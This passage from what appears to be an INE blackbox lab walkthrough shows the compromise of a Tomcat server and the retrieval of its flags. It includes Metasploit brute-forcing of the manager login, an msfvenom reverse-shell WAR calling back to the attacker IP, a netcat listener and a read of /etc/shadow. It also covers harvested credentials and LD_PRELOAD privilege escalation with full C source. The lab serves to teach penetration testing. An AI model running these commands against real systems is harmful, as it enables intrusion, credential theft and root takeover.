FLAG: 4c537c0dfd18bafdcd59f53c7015550e

And with that, we have successfully exploited two machines and found one flag. Now, only one machine remains to be exploited, and that's located at .

Step 16: Accessing the last target machine (located at ) in a web browser.

We already know that on the last target machine: , OpenSSH and Apache Tomcat services are running.

Open Firefox browser and access the Tomcat server on port 8080:

URL

[http://server3.ine.local:8080](http://server3.ine.local:8080)

![](../media/Blackbox%20lab%20INE_108.png)

As you can notice, only one image is loaded on this page. Nothing else seems to be present on the home page.

Step 17: Enumerating all the files and directories on the Tomcat server using dirb tool.

Let's use dirb to perform directory enumeration against the Tomcat server on :

Command:

dirb http://server3.ine.local:8080

![](../media/Blackbox%20lab%20INE_109.png)

As you can notice in the output above, some interesting (and sensitive) paths have been discovered like/manager.

Let's access the/managerin the browser:

URL:

[http://server3.ine.local:8080/manager](http://server3.ine.local:8080/manager)

![](../media/Blackbox%20lab%20INE_110.png)

Once the page loads up, it requests credentials to access the protected page. If you take a closer look at the dialog box, it says: "Tomcat Manager Application".

That definitely seems interesting! Let's try to exploit this in the next steps.

Step 18: Using tomcat manager login Metasploit module.

Switch back to the terminal running Metasploit Framework and use the tomcat manager login module, that is,auxiliary/scanner/http/tomcat_mgr_login:

Commands:

use auxiliary/scanner/http/tomcat_mgr_login

show options

![](../media/Blackbox%20lab%20INE_111.png)

Theshow optionscommand would list all the available configurable options for the selected module.

As you can notice most of the options are set to sane defaults. The only option we need to set isRHOSTS. We will also turn off the verbosity by setting theVERBOSEoption to false.

Use the following commands to set the RHOSTS to the target URL, that is,  and turn off the verbosity:

Commands:

set RHOSTS server3.ine.local

set VERBOSE false

exploit

![](../media/Blackbox%20lab%20INE_112.png)

The last commandexploitwould, you guessed it, exploit the target Tomcat server.

Notice that we got back the valid credentials to access the Tomcat manager application!

Step 19: Access Tomcat Manager Application interface.

Let's access the/managerresource using the credentials recovered in the previous step:

Username: tomcat Password: s3cret

![](../media/Blackbox%20lab%20INE_113.png)

![](../media/Blackbox%20lab%20INE_114.png)

And we have successfully logged in!

Scroll down to the Deploy section. In the WAR file to deploy subsection, we will upload a malicious WAR file to compromise the target server.

![](../media/Blackbox%20lab%20INE_115.png)

Step 20: Generating a malicious WAR file and deploying it to the target server.

We will use msfvenom command to generate a malicious WAR file in order to gain the shell session on the Tomcat server.

Use the following commands (withLHOSTset to the IP of your Kali instance):

Commands:

msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.73.96.2 LPORT=443 -f war > shell.war

file shell.war

Here's the summary of the flags used with msfvenom:

       -  -p: To specify a payload, which we have set to a JSP reverse TCP shell
       -  LHOST: To specify the IP address/URL of the attacker machine, that's the Kali instance in our case
       -  LPORT: The port on the attacker machine on which the listener must be started to receive back the shell session
       -  -f: To specify the output format, which we have set to war
![](../media/Blackbox%20lab%20INE_116.png)

The generated file is saved to the file named shell.war.

Now we just need to upload it to the Tomcat server and deploy it:

Switch to the browser window and then click on the Browse... button:

![](../media/Blackbox%20lab%20INE_117.png)

Now locate and select the shell.war file:

![](../media/Blackbox%20lab%20INE_118.png)

![](../media/Blackbox%20lab%20INE_119.png)

After selecting the file, click on the Deploy button:

![](../media/Blackbox%20lab%20INE_120.png)

Once the WAR file is deployed successfully, we should be able to see it in the application list:

![](../media/Blackbox%20lab%20INE_121.png)

As you can see in the above screenshot, we have successfully deployed the shell.war application.

Step 21: Starting a netcat listener on the Kali GUI instance.

Before we access the deployed shell application, we need to start the netcat listener to receive a reverse shell.

Note: Make sure that the port on which the netcat listener is started is the same one we used in the payload (theLPORTparameter) generated using the msfvenom command.

So let's start a netcat listener on port 443:

Command:

nc -lvp 443

![](../media/Blackbox%20lab%20INE_122.png)

Now access the shell application using the browser and we should have received a reverse shell on the netcat listener:

Application Path

[http://server3.ine.local:8080/shell/](http://server3.ine.local:8080/shell/)

![](../media/Blackbox%20lab%20INE_123.png)

![](../media/Blackbox%20lab%20INE_124.png)

![](../media/Blackbox%20lab%20INE_125.png)

We have received a shell and we are operating as thetomcatuser.

Step 22: Spawning a TTY shell.

The current shell is not a standard shell as it lacks quite a lot of benefits that a TTY shell provides like reverse search, tab completion, etc. So let's upgrade the current shell session using Python:

Command:

python -c 'import pty;pty.spawn("/bin/bash");'

![](../media/Blackbox%20lab%20INE_126.png)

Now we have a TTY shell.

Step 23: Reading the flag from the compromised Tomcat server.

Commands:

ls

cat FLAG1

![](../media/Blackbox%20lab%20INE_127.png)

FLAG: EBCFE35ACC27E0EA91CF3A5AB600BABE

Step 24: Checking sensitive system files like/etc/shadow.

Since we are running as tomcat user, we definitely won't have the privileges to modify any sensitive data on the system. But let's see if we have the privilege to read the/etc/shadowfile:

Command:

ls -l /etc/shadow

![](../media/Blackbox%20lab%20INE_128.png)

Information: In the/etc/shadowfile the password hashes for all the user's are present. And that's why it's one of the files that pentesters love!

As you can notice from the above output, we have read permission on this file.

Let's read this file:

Command:

cat /etc/shadow

![](../media/Blackbox%20lab%20INE_129.png)

All users present in this file are the default accounts except for robert. At this point, we have 2 options:

       -  Crack the hash and recover the password, or
       -  Enumerate further to find other ways to gain root privilege
Feel free to try both approaches. Since both are independent, you can even try your luck with both.

Since cracking the hash is the least fun and no-brainer part, we will instead focus on enumerating the machine further to give you more insights on the areas to look at during a pentest.

Step 25: Exploring Tomcat configuration files for secrets.

Let's explore Tomcat's conf folder where all the webserver configuration files are present:

Commands:

cd conf

ls

![](../media/Blackbox%20lab%20INE_130.png)

Notice that there is a gzipped archive present in the conf folder. Let's extract it's contents and see if it contains anything interesting:

Command:

tar -xvf conf.tar.gz

![](../media/Blackbox%20lab%20INE_131.png)

Notice that it's the complete backup of the Tomcat webserver's conf folder. Let's check the contents ofconf/tomcat-users.xmlfile:

Command:

cat conf/tomcat-users.xml

![](../media/Blackbox%20lab%20INE_132.png)

Interestingly enough, we have discovered password for the user robert here:robert@1234567890!@#

By the complexity of the password, you can probably guess that it would be quite difficult to break via bruteforce attempts!

Step 26: Login to the Tomcat server over SSH.

If you remember on the Tomcat server machine, that is, , OpenSSH service was also running. So we can try the credentials of user robert to access the machine over SSH.

Alternatively, we can use thesucommand to switch to robert's account.

Feel free to choose whatever option you like. We will use SSH to gain access to the target machine:

Command:

ssh robert@server3.ine.local

Type yes and then enter the credentials for robert credentials.

![](../media/Blackbox%20lab%20INE_133.png)

And that should give us the access to robert's account.

Command:

id

We can confirm that by using theidcommand.

Now since we are logged in as robert, let's look for the flag and read the flag file:

Commands:

ls

cat FLAG2

![](../media/Blackbox%20lab%20INE_134.png)

FLAG: EC2986081E84BB845541D5CC0BEE13B3

Step 27: Generating privilege escalation payload.

Now that we have access to robert's account, let's see if we can elevate our privileges to root. For that, let's check the list of privileges of robert:

Command:

sudo -l

![](../media/Blackbox%20lab%20INE_135.png)

Notice that theLD_PRELOADenvironment variable is set in the above output. Also, robert user can executelscommand withsudo(as root) without requiring a password.

By leveraging theLD_PRELOADenvironment variable, we will forcelscommand to first load a custom shared library which provides shell access on the target machine.

Add to that the fact that robert's account can use thelscommand withsudowithout any password. This will help us we will take advantage of this to run our malicious library and gain the root shell!

We will be compiling the following code as a shared library and preloading it while running thelscommand:

Code:

#include <stdio.h>

#include <sys/types.h>

#include <stdlib.h>

void _init() {

unsetenv("LD_PRELOAD");

setgid(0);

setuid(0);

system("/bin/sh");

}

The above code is simple enough. It sets the user id and group id to 0 (that's for the root user!) and spawns a bash shell. And that would end up giving us a root shell on the target machine.

The function is named_initand that's important, otherwise your exploit code won't work. The reason is that the_initfunction runs before any other user-defined code runs, to perform all the necessary initializations. So the name has to be the same, or else it won't work*.

*Note: The above statement is not entirely true._initfunction is obsolete and__attribute__((constructor))is the preferred way for writing the code that runs to perform any initializations. You can read more on it .

Save the above code asshell.c:

![](../media/Blackbox%20lab%20INE_136.png)

![](../media/Blackbox%20lab%20INE_137.png)

Now let's compile the code to generate a shared library,shared.so:

Commands:

gcc -fPIC -shared -o shell.so shell.c -nostartfiles

file shell.so

![](../media/Blackbox%20lab%20INE_138.png)

Note: If you chose to go with the__attribute__((constructor))route instead of using the_init, which is obsolete (and dangerous) way of doing things, then while generating the shared library,-nostartfiles'' or-nostdlib'' flags must not be used!

Once the above commands have been executed, we would have successfully generated the malicious shared library.

Step 28: Performing privilege escalation attacks using theLD_PRELOADenvironment variable.

Now we have everything set up in order to carry out a privilege escalation attack. We will runlscommand withsudoand set theLD_PRELOADenvironment variable to the path of the malicious shared library we just compiled in the previous step:

Commands:

id

sudo LD_PRELOAD=/home/robert/shell.so ls

id

![](../media/Blackbox%20lab%20INE_139.png)

And as you can see, we have gained a root shell!

Step 29: Reading the flag.

Now let's read the last flag:

Commands:

ls /root

cat /root/FLAG3

![](../media/Blackbox%20lab%20INE_140.png)

FLAG: 560648FC63F090A8CF776326DC13FAC7

And this completes our objective of compromising all 3 machines and retrieving all the flags from them!

